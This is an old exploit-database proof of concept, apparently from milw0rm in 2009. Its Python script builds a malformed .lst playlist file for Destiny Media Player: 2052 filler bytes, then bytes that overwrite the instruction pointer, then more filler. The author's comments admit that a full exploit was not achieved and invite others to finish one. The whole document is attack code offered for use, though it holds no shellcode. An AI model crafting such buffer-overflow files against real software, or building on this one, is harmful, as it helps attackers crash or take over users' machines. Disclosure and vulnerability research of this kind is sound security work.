#
# Destiny Media Player (lst file) Buffer overflow PoC
# By:Encrypt3d.M!nd
# I'am Iraqian...Not Arabian
###########################################
#  Well,i've tried to write an exploit for this shit but i couldn't
# the address after the NEW eip will over written,if anyone
# knows how to exploit this,be my guest

chars = "A"*2052
eip = "\x42\x42\x42\x42" # the eip will become 42424242

file=open('exp.lst','w')
file.write(chars+eip+chars)
file.close()

# milw0rm.com [2009-01-03]
